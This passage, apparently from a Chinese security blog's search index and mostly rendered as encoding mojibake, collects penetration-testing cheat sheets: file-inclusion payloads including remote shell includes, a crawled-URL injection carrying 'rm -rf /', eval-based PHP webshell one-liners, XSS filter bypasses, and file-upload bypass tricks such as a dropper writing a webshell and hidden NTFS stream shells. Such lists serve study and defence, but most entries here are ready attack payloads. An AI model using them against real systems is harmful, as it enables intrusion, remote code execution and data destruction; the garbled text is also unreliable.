æœ‰ä¸€ä¸ªphpinfo()ï¼Œè¯·å‚è€ƒæˆ‘ä»¬Dropsçš„æ–‡ç« LFI with PHPInfoæœ¬åœ°æµ‹è¯•è¿‡ç¨‹ã€‚ æœ‰é™åˆ¶çš„æœ¬åœ°æ–‡ä»¶åŒ…å«&lt;?php include(â€˜inc/â€™. $_GET[â€˜fileâ€™] . â€œ.htmâ€); ?&gt;ç©ºå­—èŠ‚æ³¨å…¥ï¼š?file=../../../../../../../../etc/passwd%00ï¼ˆéœ€è¦phpé…ç½®å…³é—­magic_quotes_gpcï¼‰ç©ºå­—èŠ‚æ³¨å…¥ç›®å½•åˆ—è¡¨ï¼š?file=../../../../../../../var/www/accounts/%00ï¼ˆä»…é™äºUFSç³»ç»Ÿä¸­ï¼Œå¹¶ä¸”éœ€è¦å…³é—­magic_quotes_gpcï¼‰è·¯å¾„æˆªæ–­ï¼š?file=../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\...ç‚¹æˆªæ–­ï¼š?file=../../../../../../etc/passwdâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ï¼ˆä»…é™äºwindowsç³»ç»Ÿä¸­ï¼‰åå‘è·¯å¾„æˆªæ–­ï¼š?file=../../../../[..]../../../etc/passwd åŸºæœ¬çš„è¿œç¨‹æ–‡ä»¶åŒ…å«&lt;?php include($_GET[â€˜fileâ€™]); ?&gt;åŒ…å«è¿œç¨‹ä»£ç ï¼š?file=[http|https|ftp]://websec.wordpress.com/shell.txtï¼ˆéœ€è¦allow_url_fopenã€å’Œallow_url_includeå¼€å¯ï¼‰ä½¿ç”¨phpï¼šinputè¾“å…¥æµï¼š?file=php://inputï¼ˆåœ¨POSTå‚æ•°ä¸­è®¾ç½®ä½ çš„æ”»å‡»è½½è·ï¼Œæ³¨æ„urlencodingï¼Œå¹¶ä¸”éœ€è¦allow_url_includeå¼€å¯ï¼‰ä½¿ç”¨URIsæ•°æ®ï¼š?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=ï¼ˆéœ€è¦allow_url_includeå¼€å¯ï¼‰ä½¿ç”¨XSSï¼š?file=http://127.0.0.1/path/xss.php?xss=phpcodeï¼ˆåªæœ‰åœ¨é˜²ç«å¢™æˆ–åœ¨ç™½åå•å†…çš„åŸŸåæ‰æœ‰æ•ˆï¼‰ æœ‰é™åˆ¶çš„è¿œç¨‹æ–‡ä»¶åŒ…å«&lt;?php include($_GET[â€˜fileâ€™] . â€œhtmâ€); ?&gt;file=https://websec.wordpress.com/shell?file=https://websec.wordpress.com/shell.txt??file=https://websec.wordpress.com/shell.txt%23ï¼ˆéœ€è¦allow_url_fopenï¼Œallow_url_includeå¼€å¯ï¼‰?file=\\evilshare\shell.phpï¼ˆç»•è¿‡allow_url_fopenå…³é—­çš„æƒ…å†µä¸‹ï¼‰è¿‡æ»¤å™¨é€ƒé€¸ï¼šè®¿é—®å¸¦é€šé…ç¬¦çš„æ–‡ä»¶ï¼š]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>PHP</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…³äºåçˆ¬è™«çš„ä¸€ä¸ªæ€è€ƒ]]></title>
    <url>%2F2017%2F03%2F05%2F%E5%85%B3%E4%BA%8E%E5%8F%8D%E7%88%AC%E8%99%AB%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘åœ¨å¼€å‘ä¸€ä¸ªPythonçš„ç³»ç»Ÿï¼Œåœ¨å†™çˆ¬è™«çš„æ—¶å€™çªç„¶æƒ³åˆ°ä¸€ä¸ªç‰¹åˆ«çŒ¥ççš„å¯¹ä»˜ä½¿ç”¨è„šæœ¬è¿›è¡Œæ‰¹é‡æ£€æµ‹çš„ä¸€ä¸ªå°æ–¹æ³•ã€‚æˆ‘ä»¬åœ¨è¿›è¡Œæ‰¹é‡æ‰«æå¹¶æ£€æµ‹çš„æ—¶å€™ï¼Œéƒ½å¯èƒ½ä¼šè°ƒç”¨ä¸€äº›ç³»ç»Ÿå‘½ä»¤ï¼Œæ¯”å¦‚å¦‚ä¸‹ä»£ç :1234...for i in get_new_urls: os.system(&quot;python sqlmap.py -u %s&quot; % i)... ä»¥ä¸Šä»£ç ï¼Œå¦‚æœæˆ‘ä»¬ç½‘ç«™çš„urlé‡Œæœ‰ä¸‹é¢çš„ä¸€ä¸ªé“¾æ¥ï¼š1&lt;a href=&quot;https://www.baidu.com | rm -rf / &quot;&gt; é‚£ä¹ˆè„šæœ¬æœ€åæ‰§è¡Œçš„å‘½ä»¤å°±æ˜¯ï¼š1os.system(&quot;python sqlmap.py -u https://www.baidu.com | rm -rf /&quot;) â€¦ æ‰€ä»¥ä½ æ‡‚çš„â€¦]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>çˆ¬è™«</tag>
        <tag>Python</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>å®‰å…¨å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP&XSSçš„ä¸€äº›å°tips]]></title>
    <url>%2F2017%2F03%2F04%2FPHP%E5%BC%B1%E7%B1%BB%E5%9E%8B-XSS%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8Ftips%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘æœé›†çš„ä¸€äº›ï¼ŒPHPè¿‡waf webshell,å¼±ç±»å‹ï¼Œopenbasedirï¼ŒXSSç»•è¿‡çš„ä¸€äº›å°tipsï¼Œæ¬¢è¿å¤§ç‰›çº é”™ã€‚-\- æ— å­—æ¯æ•°å­—webshellæ„é€ 123456789101112PHP TRUE == 1 FALSE == 0 TRUE + TRUE == 2 å¼‚æˆ–ï¼š&apos; ! &apos;^&apos; ` &apos; == &apos;A&apos;å–åï¼š~(&apos;å’Œ&apos;&#123;2&#125;) == &apos;s&apos;PHP è‡ªå¢ï¼šä»…å…è®¸å­—æ¯å­—ç¬¦è‡ªå¢&apos;a&apos;++ == &apos;b&apos;;&apos;z&apos;++ == &apos;aa&apos;;php 5.3&apos; &apos;.[] == &apos;Array&apos;&apos;Array&apos;&#123;0&#125; === &apos;A&apos;&apos;Array&apos;&#123;3&#125; === &apos;a&apos;&apos; &apos; == 0$_=&apos; &apos;.[]; $_&#123;&apos; &apos;&#125;===&apos;A&apos;; æ¸—é€æµ‹è¯•å°tips é­”æœ¯å¼•å·ä¸è¿‡æ»¤$_SERVER[]å­—æ®µï¼Œé€ æˆæ³¨å…¥ mysqlçš„ç±»å‹å¼ºåˆ¶è½¬æ¢å¯ç»•è¿‡PHPä¸­empty()å‡½æ•°å¯¹0çš„falseè¿”å› 1æäº¤/?test=0axxx -&gt; empty($_GET[&apos;test&apos;]) =&gt; è¿”å›çœŸ å½“å¯æ§å˜é‡è¿›å…¥åŒå¼•å·ä¸­æ—¶å¯å½¢æˆwebshell 12$a = &quot;$&#123;@eval($_POST[s])&#125;&quot;;$a = &quot;$&#123;$&#123;eval($_POST[s])&#125;&#125;&quot;; è¿‡æ»¤äº†ç©ºæ ¼ï¼Œé€—å·çš„æ³¨å…¥ï¼Œå¯ä½¿ç”¨æ‹¬å·åŒ…è£¹ç»•è¿‡ 12select(location)from(website);select&#123;x(name)&#125;from&#123;x(manager)&#125;; ç”±äºPHPå¼±ç±»å‹éªŒè¯æœºåˆ¶ï¼Œå¯¼è‡´==ã€in_array()ç­‰å¯é€šè¿‡å¼ºåˆ¶è½¬æ¢ç»•è¿‡éªŒè¯ã€‚ 12in_array($_GET[&apos;x&apos;],array(1,2,3,4,5))è®¿é—®?test=â€™1â€™testtestå¯åˆ¤æ–­æˆåŠŸ windowsç‰¹æ€§ 1windowsä¸‹phpä¸­è®¿é—®æ–‡ä»¶åä½¿ç”¨â€&lt;â€ â€œ&gt;â€å°†ä¼šè¢«æ›¿æ¢æˆâ€*â€ â€œ?â€ï¼Œåˆ†åˆ«ä»£è¡¨Nä¸ªä»»æ„å­—ç¬¦ä¸1ä¸ªä»»æ„å­—ç¬¦ å˜é‡è¦†ç›– 12$GLOBALS,$_SERVER,$_GET,$_POST,$_COOKIE,$_REQUEST,$_FILES,$_ENV,$_SESSIONparse_str(),mb_parse_str(),import_request_variables(),extract() PHPçš„å¼ºåˆ¶ç±»å‹è½¬æ¢çš„åŸåˆ™ å¯¹äºæ•°å­¦è¿ç®—ï¼Œå­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å€¼ å¯¹äºå­—ç¬¦ä¸²è¿ç®—ï¼Œæ•°å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²PHPå¼±ç±»å‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051== åªæ£€æŸ¥å€¼ï¼Œä¸æ£€æŸ¥ç±»å‹=== æ—¢æ£€æŸ¥å€¼ï¼Œåˆæ£€æŸ¥ç±»å‹NULL,0,â€0â€,array()ä½¿ç”¨==å’Œfalseæ¯”è¾ƒæ—¶ï¼Œéƒ½æ˜¯ä¼šè¿”å›trueçš„ï¼Œè€Œä½¿ç”¨===å´ä¸ä¼š123abc == 123 â€”&gt; true0 == &apos;abc&apos; â€”&gt; true&apos;0e132456789&apos;==&apos;0e7124511451155&apos; â€”&gt;true240610708ã€QNKCDZOã€aabg7XSsã€aabC9RqSçš„MD5ç›¸åŒintval()å‡½æ•°ï¼šstringè½¬intintval(&apos;0x1e240&apos;)==&apos;123456&apos; //trueintval(&apos;0x1e240&apos;)==123456 //trueintval(&apos;0x1e240&apos;)==&apos;1e240&apos; //falseå½“å…¶ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯0xå¼€å¤´çš„æ—¶å€™ï¼Œoxå¼€å¤´è¡¨ç¤º16è¿›åˆ¶ï¼ŒPHPä¼šå°†æ­¤å­—ç¬¦ä¸²è§£ææˆä¸ºåè¿›åˆ¶ç„¶åå†è¿›è¡Œæ¯”è¾ƒï¼Œ0Ã—1e240è§£ææˆä¸ºåè¿›åˆ¶å°±æ˜¯123456ï¼Œæ‰€ä»¥ä¸intç±»å‹å’Œstringç±»å‹çš„123456æ¯”è¾ƒéƒ½æ˜¯ç›¸ç­‰å¯¹æ•°ç»„è¿›è¡ŒMD5ï¼Œsha1ç­‰hashè¿ç®—æ—¶ï¼Œç»“æœéƒ½ä¸ºNULLmd5(name[] = 1) == md5(password[]= 2) â€”&gt;NULL == NULL â€”&gt;truestrcmpstrcmp(string $str1,string $str2 )å¦‚æœstr1å°äºstr2,è¿”å›-1ï¼Œç›¸ç­‰è¿”å›0ï¼Œå¦åˆ™è¿”å›1ã€‚strcmpå‡½æ•°æ¯”è¾ƒå­—ç¬¦ä¸²çš„æœ¬è´¨æ˜¯å°†ä¸¤ä¸ªå˜é‡è½¬æ¢ä¸ºasciiï¼Œç„¶åè¿›è¡Œå‡æ³•è¿ç®—ï¼Œç„¶åæ ¹æ®è¿ç®—ç»“æœæ¥å†³å®šè¿”å›å€¼ã€‚å¦‚æœä¼ å…¥çš„å‚æ•°ä¸ºæ•°å­—æˆ–æ•°ç»„,å†å’Œå­—ç¬¦ä¸²åšstrcmpï¼Œå°±ä¼šè¿”å›NULLstrcmp($array,&apos;123&apos;) == 0å½“arrayä¸ºæ•°å­—æˆ–è€…æ•°ç»„æ—¶ï¼Œç­‰å¼ç­‰äºtrue$array=[1,2,3] â€”&gt; strcmp([1,2,3] ,&apos;123&apos;) â€”&gt; NULL â€”&gt;NULL == 0in_array()ï¼šå‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼$array=(0,1,2,&apos;3&apos;)in_array(&apos;abc&apos;, $array) â€”&gt; &apos;abc&apos; â€”&gt; 0 â€”&gt; 0 == array[0] â€”&gt; true$array=(0,1,2,3)in_array($search, $array)å½“ä¼ å…¥$search = 1&apos;aaaaaaaa ç»“æœä¸ºtruein_array($search, $array) â€”&gt; 1&apos;aaaaaaaa â€”&gt; 1 â€”&gt; 1 == array[1] â€”&gt; trueæ³¨ï¼šin_array æœ‰ç¬¬ä¸‰ä¸ªå‚æ•°in_array(â€™5\â€™ union selectâ€™, array(1, 5, 3, 2), true) â€”&gt; falseeregereg(string pattern, string string, array [regs])å­—ç¬¦ä¸²å¯¹æ¯”è§£æï¼Œä»¥ pattern çš„è§„åˆ™æ¥è§£ææ¯”å¯¹å­—ç¬¦ä¸² stringã€‚æ¯”å¯¹ç»“æœè¿”å›çš„å€¼æ”¾åœ¨æ•°ç»„å‚æ•° regs ä¹‹ä¸­ï¼Œregs[0] å†…å®¹å°±æ˜¯åŸå­—ç¬¦ä¸² stringã€regs[1] ä¸ºç¬¬ä¸€ä¸ªåˆä¹è§„åˆ™çš„å­—ç¬¦ä¸²ã€regs[2] å°±æ˜¯ç¬¬äºŒä¸ªåˆä¹è§„åˆ™çš„å­—ç¬¦ä¸²ï¼Œä½™ç±»æ¨ã€‚è‹¥çœç•¥å‚æ•° regsï¼Œåˆ™åªæ˜¯å•çº¯åœ°æ¯”å¯¹ï¼Œæ‰¾åˆ°åˆ™è¿”å›å€¼ä¸º trueã€‚eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå½“eregè¯»å–å­—ç¬¦ä¸²stringæ—¶,å¦‚æœé‡åˆ°äº†%00,åé¢çš„å­—ç¬¦ä¸²å°±ä¸ä¼šè¢«è§£æ$ip = &quot;192.168.2.11&quot;.chr(0).&quot;haha&quot;; if(ereg(&quot;^[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;$&quot;,$ip)) &#123; echo $ip; &#125; else &#123; echo &quot;unknown&quot;; &#125; è¾“å‡ºï¼š192.168.2.11hahaæ³¨ï¼šç»“åˆeregå¤„ç†$ _SERVERçš„æƒ…å†µ ç»•è¿‡open_basedir12345åˆ©ç”¨DirectoryIterator + Glob ç›´æ¥åˆ—ä¸¾ç›®å½•realpathåˆ—ä¸¾ç›®å½•SplFileInfo::getRealPathåˆ—ä¸¾ç›®å½•GDåº“imageftbbox/imagefttextåˆ—ä¸¾ç›®å½•bindtextdomainæš´åŠ›çŒœè§£ç›®å½• XSSç»•è¿‡123456789. å¯ä»¥ç”¨ withonerror å¯ä»¥ç”¨ onblur oncutwindow å¯ä»¥ç”¨ top parent selfal%00ert``\x0A\x0D å¯ä»¥ç”¨ \x2028\x2029base64è§£ç å‡½æ•°atob()&quot;oncut=_=window;_.onerror=_[&quot;al&quot;+&quot;ert&quot;];throw[1]&quot;oncut=location=&quot;javascript:aler&quot;+&quot;t%&quot;+&quot;281%&quot;+&quot;29]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>XSS</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ–‡ä»¶ä¸Šä¼ (ç»•è¿‡)]]></title>
    <url>%2F2017%2F02%2F21%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[æ ¹æ®ä¸ªäººç»éªŒ,æœé›†æ€»ç»“ï¼Œæ¬¢è¿å¤§ç‰›ä»¬è¡¥å……ã€çº é”™ -_- æ–‡ä»¶ä¸Šä¼ æ ¡éªŒå§¿åŠ¿ å®¢æˆ·ç«¯javascriptæ ¡éªŒï¼ˆä¸€èˆ¬åªæ ¡éªŒåç¼€åï¼‰ æœåŠ¡ç«¯æ ¡éªŒ æ–‡ä»¶å¤´content-typeå­—æ®µæ ¡éªŒï¼ˆimage/gifï¼‰ æ–‡ä»¶å†…å®¹å¤´æ ¡éªŒï¼ˆGIF89aï¼‰ åç¼€åé»‘åå•æ ¡éªŒ åç¼€åç™½åå•æ ¡éªŒ è‡ªå®šä¹‰æ­£åˆ™æ ¡éªŒ WAFè®¾å¤‡æ ¡éªŒï¼ˆæ ¹æ®ä¸åŒçš„WAFäº§å“è€Œå®šï¼‰ æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ ¡éªŒå§¿åŠ¿ å®¢æˆ·ç«¯ç»•è¿‡ï¼ˆæŠ“åŒ…æ”¹åŒ…ï¼‰ æœåŠ¡ç«¯ç»•è¿‡ æ–‡ä»¶ç±»å‹ æ–‡ä»¶å¤´ æ–‡ä»¶åç¼€å é…åˆæ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡ é…åˆæœåŠ¡å™¨è§£ææ¼æ´ç»•è¿‡ CMSã€ç¼–è¾‘å™¨æ¼æ´ç»•è¿‡ é…åˆæ“ä½œç³»ç»Ÿæ–‡ä»¶å‘½åè§„åˆ™ç»•è¿‡ é…åˆå…¶ä»–è§„åˆ™ç»•è¿‡ WAFç»•è¿‡ é»‘åå•ç»•è¿‡ ç™½åå•ç»•è¿‡ 1.å®¢æˆ·ç«¯ç»•è¿‡å¯ä»¥åˆ©ç”¨burpç­‰æŠ“åŒ…æ”¹åŒ…ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªgifç±»å‹çš„æœ¨é©¬ï¼Œç„¶åé€šè¿‡burpå°†å…¶æ”¹ä¸ºasp/php/jspåç¼€åå³å¯ã€‚ 2.æœåŠ¡ç«¯ç»•è¿‡2.1 æ–‡ä»¶ç±»å‹ç»•è¿‡æˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ“åŒ…ï¼Œå°†content-typeå­—æ®µæ”¹ä¸ºimage/gif 2.2 æ–‡ä»¶å¤´ç»•è¿‡åœ¨æœ¨é©¬æ–‡ä»¶å†…å®¹å¼€å¤´åŠ ä¸Šä¸€äº›æ–‡ä»¶å¤´ä¿¡æ¯ GIF89a&lt;?php phpinfo(); ?&gt; åˆ¤æ–­æ–‡ä»¶å¤´å†…å®¹æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œè¿™é‡Œä¸¾å‡ ä¸ªå¸¸è§çš„æ–‡ä»¶å¤´å¯¹åº”å…³ç³»ï¼š1234ï¼ˆ1ï¼‰ .JPEG;.JPE;.JPGï¼Œâ€JPGGraphic Fileâ€ï¼ˆ2ï¼‰ .gifï¼Œâ€GIF 89Aâ€ï¼ˆ3ï¼‰ .zipï¼Œâ€Zip Compressedâ€ï¼ˆ4ï¼‰ .doc;.xls;.xlt;.ppt;.aprï¼Œâ€MS Compound Document v1 or Lotus Approach APRfileâ€ 2.3 æ–‡ä»¶å/åç¼€ç»•è¿‡2.3.1 æˆªæ–­test.php%00.jpg,test.php0xoo.jpg 2.3.2 windowsç‰¹æ€§123456789ADSæµï¼štest.php::$DATA(è§ä¸‹)test.php.test.php_test.php(ç©ºæ ¼)*=.&lt;=*&gt;=?test.&lt;&lt;&lt;test.php:1.jpgä¼šç”Ÿæˆä¸€ä¸ªtest.phpçš„ç©ºæ–‡ä»¶ 2.3.3 ASP1234567891011121314è§£ææ¼æ´:.asp;.jpg.asp.jpg.asp;jpg+111.asp;+222.jpg/111.asp/1.jpg/111.aspx/1.jpgåç¼€åï¼šasa,cer,cdx,ashx,asmx,xml,htr,asaxåŒæ–‡ä»¶æ‰©å±•ï¼štest.asp.jpgRTLOï¼šasp.html-å†…å®¹ä¸ºä¸€å¥è¯php.txt-å†…å®¹ä¸ºä¸€å¥è¯ 2.3.4 JSP12.jsp.jpg.jsp-ç”¨ä¸¤ä¸ªjspåŒ…å›´ä¸­é—´çš„jpgåç¼€åï¼šjspf,jspa,jsps 2.3.5 PHP1234567891011121314åç¼€åï¼š.php3 ,.php5,.php7å¤§å°å†™ï¼špHpè§£ææ¼æ´ï¼š1.php.jpg1.jpg.php1.php jpg(jpgå‰é¢ä¸¤ä¸ªç©ºæ ¼)1.php jpg(jpgå‰é¢ä¸€ä¸ªç©ºæ ¼)/1.jpg/1.php/1.jpg%00.php/1.jpg/.php/1.jpg/phpç‰¹æ®Šæ–‡ä»¶åˆ©ç”¨ï¼š.htaccess.user.ini 3.é…åˆæ–‡ä»¶åŒ…å«æ¼æ´ ä¸Šä¼ ä¸€ä¸ªç¬¦åˆæ¡ä»¶æ ¼å¼çš„æ–‡æ¡£ï¼Œæ–‡æ¡£å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œegï¼štest.txt åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶,eg:page?id=D:/www/test.txt 4.é…åˆæœåŠ¡å™¨è§£ææ¼æ´123456789101112131415161718IIS5.x-6.x:ç›®å½•è§£æ(6.0):/1.asp/1.jpgæ–‡ä»¶è§£æ:1.asp;.jpgæ–‡ä»¶ç±»å‹:1.asa,a.cer,1.cdxIIS7.5ï¼šIIS7.5æ˜¯ç”±äºphpé…ç½®æ–‡ä»¶ä¸­ï¼Œå¼€å¯äº†cgi.fix_pathinfApache:ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­åç¼€ä¸è¯†åˆ«ï¼š1.php.php123é…ç½®é”™è¯¯ï¼š1.php.jpgNginxï¼šNginxé»˜è®¤æ˜¯ä»¥CGIçš„æ–¹å¼æ”¯æŒPHPè§£æçš„ï¼Œå’ŒIIS7.5ä¸€æ ·å¼€å¯äº†cgi.fix_pathinf1.jpg/1.php1.jpg%00.php1.jpg/%20\1.phpä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºtest.jpgï¼Œä»¥ä¸‹å†…å®¹çš„æ–‡ä»¶&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[caidao])?&gt;&apos;);?&gt;ç„¶åè®¿é—®test.jpg/.php,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬shell.php 5.é…åˆæ“ä½œç³»ç»Ÿæ–‡ä»¶å‘½ä»¤è§„åˆ™ ä¸Šä¼ ä¸ç¬¦åˆwindowsæ–‡ä»¶å‘½åè§„åˆ™çš„æ–‡ä»¶å 123456test.asp.test.asp(ç©ºæ ¼)test.php:1.jpgtest.php::$DATAshell.php::$DATAâ€¦â€¦.ä¼šè¢«windowsç³»ç»Ÿè‡ªåŠ¨å»æ‰ä¸ç¬¦åˆè§„åˆ™ç¬¦å·åé¢çš„å†…å®¹ã€‚ linuxä¸‹åç¼€åå¤§å°å†™åœ¨linuxä¸‹ï¼Œå¦‚æœä¸Šä¼ phpä¸è¢«è§£æï¼Œå¯ä»¥è¯•è¯•ä¸Šä¼ pHpåç¼€çš„æ–‡ä»¶åã€‚ 6.CMSã€ç¼–è¾‘å™¨æ¼æ´ CMSæ¼æ´ï¼šé’ˆå¯¹ä¸åŒCMSå­˜åœ¨çš„ä¸Šä¼ æ¼æ´è¿›è¡Œç»•è¿‡ã€‚ ç¼–è¾‘å™¨æ¼æ´ï¼šæ¯”å¦‚FCKï¼ŒEwebeditorç­‰ï¼Œå¯ä»¥é’ˆå¯¹ç¼–è¾‘å™¨çš„æ¼æ´è¿›è¡Œç»•è¿‡ã€‚ 7.å…¶ä»–è§„åˆ™7.1 åˆ©ç”¨wafç‰¹æ€§ åœ¨æ¶æ„ä»£ç å‰åŠ åƒåœ¾æ•°æ®ï¼› åœ¨æ•°æ®åŒ…å‰åŠ åƒåœ¾æ•°æ®ï¼› åœ¨Content-Dispositionå‚æ•°åé¢åŠ åƒåœ¾æ•°æ®ï¼› å¤šåŠ ä¸€ä¸ªfilenameï¼› æ›´æ”¹HTTPè¯·æ±‚æ–¹æ³•ï¼› åˆ é™¤å®ä½“é‡Œé¢çš„Conten-Typeå­—æ®µï¼› ç¬¬ä¸€ç§æ˜¯åˆ é™¤Contentæ•´è¡Œï¼Œç¬¬äºŒç§æ˜¯åˆ é™¤Cåé¢çš„å­—ç¬¦ã€‚åˆ é™¤æ‰ontent-Type: image/jpegåªç•™ä¸‹cï¼Œå°†.phpåŠ cåé¢å³å¯ï¼Œä½†æ˜¯è¦æ³¨æ„é¢ï¼ŒåŒå¼•å·è¦è·Ÿç€c.phpã€‚ åˆ é™¤Content-Dispositionå­—æ®µé‡Œçš„ç©ºæ ¼ å¢åŠ ä¸€ä¸ªç©ºæ ¼ ä¿®æ”¹Content-Dispositionå­—æ®µå€¼çš„å¤§å°å†™ æ–‡ä»¶ååç¼€å¤„å›è½¦ å¤šä¸ªContent-Disposition7.2 åˆ©ç”¨NTFS ADSç‰¹æ€§ADSæ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œç”¨äºNTFSäº¤æ¢æ•°æ®æµã€‚12345test.php:a.jpg ç”Ÿæˆtest.php ç©ºtest.php::$INDEX_ALLOCATION ç”Ÿæˆtest.phpæ–‡ä»¶å¤¹ test.php::$DATA\1.jpg ç”Ÿæˆ1.jpg(ä¸å¯è§çš„)echo ^&lt;?php @eval(request[caidao])?^&gt; &gt; index.php:hidden.jpgè¿™æ ·å­å°±ç”Ÿæˆäº†ä¸€ä¸ªä¸å¯è§çš„shell hidden.jpgï¼Œå¸¸è§„çš„æ–‡ä»¶ç®¡ç†å™¨ã€typeå‘½ä»¤ï¼Œdirå‘½ä»¤ã€delå‘½ä»¤å‘ç°éƒ½æ‰¾ä¸å‡ºé‚£ä¸ªhidden.jpgçš„ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å¦å¤–ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶é‡ŒæŠŠè¿™ä¸ªADSæ–‡ä»¶includeè¿›å»ï¼Œ&lt;?php include(â€˜index.php:hidden.jpgâ€™)?&gt;ï¼Œè¿™æ ·å­å°±å¯ä»¥æ­£å¸¸è§£ææˆ‘ä»¬çš„ä¸€å¥è¯äº† 7.3 åˆ©ç”¨RTLO1234æ–°å»ºä¸€ä¸ªæ–‡ä»¶php.htmlå†…å®¹ä¸ºï¼š&lt;?php @eval($_POST[&apos;caidao&apos;]);?&gt;é‡å‘½åæ–‡ä»¶ï¼šè¾“å…¥åå­—çš„æ–‡æœ¬æ¡†é‡Œç‚¹å³é”®ï¼Œé€‰æ‹©â€œæ’å…¥unicodeæ§åˆ¶å­—ç¬¦â€ï¼Œç„¶åå°±åˆ°äº†è¿™ä¸ªèœå•æ ï¼Œæˆ‘ä»¬é€‰æ‹©RLOè¿™ä¸ªæ—¶å€™php.htmlå·²ç»å˜æˆäº†html.phpäº† 7.4 ç‰¹æ®Šçš„é•¿æ–‡ä»¶åç»•è¿‡æ–‡ä»¶åä½¿ç”¨éå­—æ¯æ•°å­—ï¼Œæ¯”å¦‚ä¸­æ–‡ç­‰æœ€å¤§ç¨‹åº¦çš„æ‹‰é•¿shell.asp;ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹.jpg 7.5 ååˆ é™¤å°†name=&quot;file1&quot;æ”¹æˆäº†file4ï¼Œå¯ä»¥é˜²æ­¢æ–‡ä»¶åˆ é™¤ï¼ˆJCMSæ¼æ´ï¼‰ 7.8 å›¾ç‰‡è½¬æ¢/äºŒæ¬¡æ¸²æŸ“/æ–‡ä»¶å¹»æ•°æ£€æµ‹ åœ¨ä¸ç ´åæ–‡ä»¶æœ¬èº«æ¸²æŸ“æƒ…å†µä¸‹ï¼Œåœ¨ç©ºç™½åŒºè¿›è¡Œä»£ç å¡«å……ï¼Œä¸€èˆ¬æ˜¯å›¾ç‰‡æ³¨é‡Š æº¢å‡ºæ”»å‡» ç»•è¿‡GDåº“ â€¦]]></content>
      <tags>
        <tag>WAFç»•è¿‡</tag>
        <tag>PHP</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åº”æ€¥å“åº”èµ„æ–™æ•´ç†]]></title>
    <url>%2F2017%2F02%2F13%2F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%2F</url>
